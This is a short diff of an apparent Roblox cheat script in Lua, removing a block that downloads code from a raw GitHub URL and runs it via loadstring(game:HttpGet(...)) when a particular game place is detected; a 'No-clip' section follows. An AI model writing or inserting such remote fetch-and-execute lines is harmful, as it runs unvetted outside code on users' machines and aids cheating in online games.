@@ -55,9 +55,7 @@ task.spawn(function()
 end)
 end
 
-if game.PlaceId == 3565304751 then
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Imsleepyasf/wild/refs/heads/main/queue", true))()
-end
+
 
 
 -- No-clip
